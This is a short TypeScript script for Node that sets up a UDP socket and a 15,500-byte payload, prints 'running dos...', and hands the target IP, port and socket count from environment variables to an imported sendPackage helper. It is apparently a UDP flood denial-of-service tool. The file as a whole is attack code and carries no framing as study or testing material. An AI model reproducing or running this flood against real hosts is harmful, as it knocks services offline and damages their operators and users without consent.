import * as dgram from "dgram";
import { sendPackage } from "./utils/sendPackages";
require("dotenv").config();


const client =  dgram.createSocket("udp4");
const message = Buffer.alloc(15500)
let sentPackage = 0

console.log("running dos...")
sendPackage(message, client, process.env.IP, Number(process.env.PORT), Number(process.env.SOCKETS), sentPackage)
